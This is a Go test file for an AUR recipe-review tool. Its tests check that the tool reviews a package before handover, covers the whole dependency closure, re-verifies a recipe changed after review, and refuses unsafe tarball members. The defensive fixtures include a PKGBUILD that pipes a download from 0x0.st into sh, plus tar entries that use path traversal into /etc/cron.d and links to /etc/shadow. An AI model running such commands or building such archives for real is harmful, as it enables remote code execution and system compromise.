// cmd/aurvet/install_test.go
//
// No test here reaches the network, builds anything, or runs a helper. The
// recipe source is a seam (installOpts.src) and the AUR client is aur.Fake.
package main

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/lookatitude/aurvet/internal/aur"
	"github.com/lookatitude/aurvet/internal/config"
	"github.com/lookatitude/aurvet/internal/gate"
)

// fakeSource serves recipe files from memory, keyed on pkgbase.
type fakeSource struct {
	recipes map[string]map[string][]byte
	fetched []string
}

func (f *fakeSource) Fetch(_ context.Context, pkgbase string) (map[string][]byte, error) {
	f.fetched = append(f.fetched, pkgbase)
	files, ok := f.recipes[pkgbase]
	if !ok {
		return nil, errNoSuchRecipe
	}
	return files, nil
}

func (f *fakeSource) Describe() string { return "fixture source" }

// recipe builds one pkgbase's files: a PKGBUILD that fires one rule and a
// matching .SRCINFO carrying the declared dependencies.
func recipe(pkgbase string, deps ...string) map[string][]byte {
	pkgbuild := "pkgbase=" + pkgbase + "\npkgname=" + pkgbase + "\npkgver=1.0\npkgrel=1\narch=('x86_64')\n" +
		"source=(\"https://example.com/" + pkgbase + "-1.0.tar.gz\")\nsha256sums=('SKIP')\n" +
		"build() {\n  curl -fsSL https://example.com/blob.bin -o blob.bin\n}\n" +
		"package() {\n  install -Dm644 blob.bin \"$pkgdir/usr/share/" + pkgbase + "/blob.bin\"\n}\n"
	srcinfo := "pkgbase = " + pkgbase + "\n\tpkgver = 1.0\n"
	for _, d := range deps {
		srcinfo += "\tdepends = " + d + "\n"
	}
	srcinfo += "\npkgname = " + pkgbase + "\n"
	return map[string][]byte{"PKGBUILD": []byte(pkgbuild), ".SRCINFO": []byte(srcinfo)}
}

// installFixture returns a scanned root, a state directory and the opts that
// bind them together with the two seams.
func installFixture(t *testing.T, src *fakeSource, answer string) (installOpts, string, string) {
	t.Helper()
	root := t.TempDir()
	state := t.TempDir()
	writeFixture(t, root, "etc/passwd", "u:x:1000:1000::/home/u:/bin/sh\n")
	if err := os.MkdirAll(filepath.Join(root, "var/lib/pacman/local"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(root, "var/lib/pacman/sync"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("AURVET_STATE_DIR", state)
	return installOpts{
		pkgbase:  "foo",
		liveRoot: root,
		src:      src,
		cl:       aur.Fake{Known: map[string]aur.Pkg{}},
		stageDir: filepath.Join(t.TempDir(), "stage"),
		stdin:    strings.NewReader(answer + "\n"),
	}, root, state
}

// TestInstallRefusesUnderOfflineRoot: INV-5. There is no correct place to stage
// a build under a tree being inspected, and no correct place to write an
// approval about another machine's packages.
func TestInstallRefusesUnderOfflineRoot(t *testing.T) {
	root := t.TempDir()
	before := walkTree(t, root)
	var stdout, stderr bytes.Buffer
	if code := run([]string{"-offline-root", root, "install", "foo"}, &stdout, &stderr); code != exitUsage {
		t.Fatalf("run = %d, want %d\nstderr: %s", code, exitUsage, stderr.String())
	}
	if !strings.Contains(stderr.String(), "offline-root") {
		t.Errorf("stderr does not say why: %s", stderr.String())
	}
	if after := walkTree(t, root); after != before {
		t.Errorf("install wrote into the examined tree")
	}
}

// TestInstallRefusesWithoutNetwork: install must fetch to review; `review` is
// the command that analyses what is already on disk.
func TestInstallRefusesWithoutNetwork(t *testing.T) {
	var stdout, stderr bytes.Buffer
	if code := run([]string{"-no-network", "install", "foo"}, &stdout, &stderr); code != exitUsage {
		t.Fatalf("run = %d, want %d\nstderr: %s", code, exitUsage, stderr.String())
	}
	if !strings.Contains(stderr.String(), "no-network") {
		t.Errorf("stderr does not say why: %s", stderr.String())
	}
}

// TestInstallOrderIsFetchReviewPromptSnapshotHandover: the ordering IS the
// security property. Snapshot before handover, because the point is to capture
// provenance while it still exists.
func TestInstallOrderIsFetchReviewPromptSnapshotHandover(t *testing.T) {
	src := &fakeSource{recipes: map[string]map[string][]byte{"foo": recipe("foo")}}
	opts, _, state := installFixture(t, src, "yes")

	var stdout, stderr bytes.Buffer
	code := runInstall(opts, &stdout, &stderr)
	if code == exitClean {
		t.Fatalf("run = 0: a closure with unreviewable parts must never exit 0\n%s", stdout.String())
	}
	out := stdout.String()
	iReview := strings.Index(out, "rule hits")
	iPrompt := strings.Index(out, "proceed?")
	iSnap := strings.Index(out, "snapshot")
	iHand := strings.Index(out, "handover:")
	for _, step := range []struct {
		name string
		at   int
	}{{"review", iReview}, {"prompt", iPrompt}, {"snapshot", iSnap}, {"handover", iHand}} {
		if step.at < 0 {
			t.Fatalf("output has no %s step:\n%s", step.name, out)
		}
	}
	if !(iReview < iPrompt && iPrompt < iSnap && iSnap < iHand) {
		t.Errorf("steps out of order (review %d, prompt %d, snapshot %d, handover %d):\n%s",
			iReview, iPrompt, iSnap, iHand, out)
	}
	if len(src.fetched) != 1 || src.fetched[0] != "foo" {
		t.Errorf("fetched = %v, want [foo]", src.fetched)
	}

	// The snapshot is on disk, keyed on pkgbase, before the handover line was
	// printed -- assert the record, not just the word.
	if ents, err := os.ReadDir(filepath.Join(state, "snapshots", "foo")); err != nil || len(ents) != 1 {
		t.Fatalf("snapshot records = %v, err = %v", ents, err)
	}
	// The approval is recorded too, so the next review is silent.
	st, err := gate.OpenStore(config.Config{StateDir: state, Root: "/"})
	if err != nil {
		t.Fatal(err)
	}
	if dec := st.Lookup("foo", stagedDigest(t, opts.stageDir, "foo")); dec.Status != gate.StatusApproved {
		t.Errorf("approval status after a yes = %q, want %q", dec.Status, gate.StatusApproved)
	}
	// Nothing was built. A staging directory that acquired src/ or pkg/ means
	// something ran makepkg.
	for _, bad := range []string{"src", "pkg"} {
		if _, err := os.Stat(filepath.Join(opts.stageDir, "foo", bad)); err == nil {
			t.Errorf("%s/ exists in the staging directory: something built", bad)
		}
	}
	if !strings.Contains(out, "aurvet does not run") {
		t.Errorf("output does not state that aurvet hands over rather than builds:\n%s", out)
	}
}

// stagedDigest recomputes the recipe digest of a staged pkgbase the way install
// does, so a test can assert what was approved.
func stagedDigest(t *testing.T, stage, pkgbase string) string {
	t.Helper()
	r, err := os.OpenRoot(stage)
	if err != nil {
		t.Fatal(err)
	}
	defer r.Close()
	rec, err := gate.DigestRecipe(r, gate.RecipeRequest{PkgBase: pkgbase, Dir: pkgbase})
	if err != nil {
		t.Fatal(err)
	}
	return rec.Digest
}

// TestInstallDeclinedHandsNothingOver: the prompt is a control, so "no" must
// leave no approval, no snapshot and no handover.
func TestInstallDeclinedHandsNothingOver(t *testing.T) {
	src := &fakeSource{recipes: map[string]map[string][]byte{"foo": recipe("foo")}}
	opts, _, state := installFixture(t, src, "no")

	var stdout, stderr bytes.Buffer
	code := runInstall(opts, &stdout, &stderr)
	if code == exitClean {
		t.Fatalf("a declined install exited 0, which reads as success:\n%s", stdout.String())
	}
	out := stdout.String()
	if strings.Contains(out, "handover:") {
		t.Errorf("a declined install handed the directory over:\n%s", out)
	}
	if _, err := os.Stat(filepath.Join(state, "snapshots", "foo")); err == nil {
		t.Errorf("a declined install captured a snapshot")
	}
	st, _ := gate.OpenStore(config.Config{StateDir: state, Root: "/"})
	if dec := st.Lookup("foo", stagedDigest(t, opts.stageDir, "foo")); dec.Status == gate.StatusApproved {
		t.Errorf("a declined install recorded an approval")
	}
}

// TestInstallRefusesHandoverWhenTheRecipeChangedAfterReview is the TOCTOU
// property: reviewing bytes and handing over a path is an approval of whatever
// the path holds LATER unless the bytes are re-verified at the last moment.
func TestInstallRefusesHandoverWhenTheRecipeChangedAfterReview(t *testing.T) {
	src := &fakeSource{recipes: map[string]map[string][]byte{"foo": recipe("foo")}}
	opts, _, _ := installFixture(t, src, "yes")
	opts.afterPrompt = func(stage string) {
		// The attacker owns the staging path between review and handover.
		if err := os.WriteFile(filepath.Join(stage, "foo", "PKGBUILD"),
			[]byte("pkgbase=foo\npkgname=foo\npkgver=1.0\npkgrel=1\nbuild(){ curl -s https://0x0.st/x | sh; }\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}

	var stdout, stderr bytes.Buffer
	code := runInstall(opts, &stdout, &stderr)
	out := stdout.String()
	if strings.Contains(out, "handover:") {
		t.Fatalf("the directory was handed over after the recipe changed:\n%s", out)
	}
	if !strings.Contains(out, "install-recipe-changed-after-review") {
		t.Errorf("output does not report the change between review and handover:\n%s", out)
	}
	if code == exitClean {
		t.Errorf("run = 0 after refusing the handover")
	}
}

// TestInstallReviewsTheWholeDependencyClosure: the attacker's move is a benign
// package pulling a malicious dependency, so a review of the root recipe alone
// is not a review.
func TestInstallReviewsTheWholeDependencyClosure(t *testing.T) {
	src := &fakeSource{recipes: map[string]map[string][]byte{
		"foo": recipe("foo", "bar", "glibc"),
		"bar": recipe("bar"),
	}}
	opts, root, _ := installFixture(t, src, "no")
	// glibc is a repository package: present in the sync DB, so it is not part
	// of the AUR closure.
	writeSyncName(t, root, "core", "glibc")
	opts.cl = aur.Fake{Known: map[string]aur.Pkg{
		"bar": {Name: "bar", PackageBase: "bar"},
	}}

	var stdout, stderr bytes.Buffer
	runInstall(opts, &stdout, &stderr)
	out := stdout.String()
	if !strings.Contains(out, "recipe bar") && !strings.Contains(out, "pkgbase bar") {
		t.Errorf("the dependency was not reviewed:\n%s", out)
	}
	if !strings.Contains(out, "dependency closure") {
		t.Errorf("the closure tree was not printed:\n%s", out)
	}
	if !strings.Contains(out, "foo") || !strings.Contains(out, "└") && !strings.Contains(out, "bar") {
		t.Errorf("the tree does not show foo -> bar:\n%s", out)
	}
	if len(src.fetched) != 2 {
		t.Errorf("fetched = %v, want both foo and bar", src.fetched)
	}
	if strings.Contains(out, "recipe glibc") {
		t.Errorf("a repository dependency was fetched from the AUR:\n%s", out)
	}
}

// writeSyncName adds one package name to a fixture sync database.
func writeSyncName(t *testing.T, root, repo, name string) {
	t.Helper()
	dir := filepath.Join(root, "var/lib/pacman/sync", repo+".db")
	if err := os.MkdirAll(filepath.Dir(dir), 0o755); err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	body := "%NAME%\n" + name + "\n"
	if err := tw.WriteHeader(&tar.Header{Name: name + "-1.0-1/desc", Mode: 0o644, Size: int64(len(body))}); err != nil {
		t.Fatal(err)
	}
	if _, err := tw.Write([]byte(body)); err != nil {
		t.Fatal(err)
	}
	tw.Close()
	gz.Close()
	if err := os.WriteFile(dir, buf.Bytes(), 0o644); err != nil {
		t.Fatal(err)
	}
}

// TestInstallUnresolvableDependencyIsAGapNotSilence: INV-9. A dependency that is
// neither a repository package nor an AUR package means the closure was not
// resolved, and a prompt that says "nothing found" about it is the worst output
// this tool can produce.
func TestInstallUnresolvableDependencyIsAGapNotSilence(t *testing.T) {
	src := &fakeSource{recipes: map[string]map[string][]byte{"foo": recipe("foo", "mystery-dep")}}
	opts, _, _ := installFixture(t, src, "no")

	var stdout, stderr bytes.Buffer
	code := runInstall(opts, &stdout, &stderr)
	if code != exitIncomplete {
		t.Fatalf("run = %d, want %d\n%s", code, exitIncomplete, stdout.String())
	}
	if !strings.Contains(stdout.String(), "install-dependency-unresolved") {
		t.Errorf("the unresolved dependency is not reported as a gap:\n%s", stdout.String())
	}
}

// TestInstallPromptStatesCoverageBeforeAsking: INV-3 -- never present a clean
// prompt for a closure that could not be fully reviewed.
func TestInstallPromptStatesCoverageBeforeAsking(t *testing.T) {
	src := &fakeSource{recipes: map[string]map[string][]byte{"foo": recipe("foo", "mystery-dep")}}
	opts, _, _ := installFixture(t, src, "no")

	var stdout, stderr bytes.Buffer
	runInstall(opts, &stdout, &stderr)
	out := stdout.String()
	prompt := strings.Index(out, "proceed?")
	gapline := strings.Index(out, "coverage is INCOMPLETE")
	if prompt < 0 || gapline < 0 {
		t.Fatalf("prompt = %d, coverage banner = %d:\n%s", prompt, gapline, out)
	}
	if gapline > prompt {
		t.Errorf("the prompt came before the coverage banner:\n%s", out)
	}
}

// --- the AUR snapshot source ------------------------------------------------

// TestAURSnapshotSourceRefusesUnsafeMembers: the tarball is attacker-controlled.
// A member that escapes, a symlink, a device and an over-cap file must all be
// refused rather than written.
func TestAURSnapshotSourceRefusesUnsafeMembers(t *testing.T) {
	cases := []struct {
		name string
		hdr  tar.Header
		body string
	}{
		{"traversal", tar.Header{Name: "foo/../../etc/cron.d/x", Typeflag: tar.TypeReg, Mode: 0o644}, "x"},
		{"absolute", tar.Header{Name: "/etc/cron.d/x", Typeflag: tar.TypeReg, Mode: 0o644}, "x"},
		{"symlink", tar.Header{Name: "foo/link", Typeflag: tar.TypeSymlink, Linkname: "/etc/shadow"}, ""},
		{"hardlink", tar.Header{Name: "foo/link", Typeflag: tar.TypeLink, Linkname: "/etc/shadow"}, ""},
		{"other pkgbase", tar.Header{Name: "bar/PKGBUILD", Typeflag: tar.TypeReg, Mode: 0o644}, "x"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var buf bytes.Buffer
			gz := gzip.NewWriter(&buf)
			tw := tar.NewWriter(gz)
			hdr := tc.hdr
			hdr.Size = int64(len(tc.body))
			if err := tw.WriteHeader(&hdr); err != nil {
				t.Fatal(err)
			}
			if _, err := tw.Write([]byte(tc.body)); err != nil {
				t.Fatal(err)
			}
			tw.Close()
			gz.Close()

			files, err := readSnapshotTarball("foo", &buf, defaultFetchLimits())
			if err == nil && len(files) != 0 {
				t.Fatalf("member %q was accepted: %v", tc.hdr.Name, keysOf(files))
			}
		})
	}
}

// TestAURSnapshotSourceReadsAWellFormedTarball is the positive control: without
// it the test above could pass on a reader that refuses everything.
func TestAURSnapshotSourceReadsAWellFormedTarball(t *testing.T) {
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for name, body := range map[string]string{
		"foo/PKGBUILD":    "pkgbase=foo\n",
		"foo/.SRCINFO":    "pkgbase = foo\n",
		"foo/foo.install": "post_install() { :; }\n",
	} {
		if err := tw.WriteHeader(&tar.Header{Name: name, Typeflag: tar.TypeReg, Mode: 0o644, Size: int64(len(body))}); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(body)); err != nil {
			t.Fatal(err)
		}
	}
	tw.Close()
	gz.Close()

	files, err := readSnapshotTarball("foo", &buf, defaultFetchLimits())
	if err != nil {
		t.Fatalf("readSnapshotTarball: %v", err)
	}
	for _, want := range []string{"PKGBUILD", ".SRCINFO", "foo.install"} {
		if _, ok := files[want]; !ok {
			t.Errorf("%s missing from %v", want, keysOf(files))
		}
	}
}

func keysOf(m map[string][]byte) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}
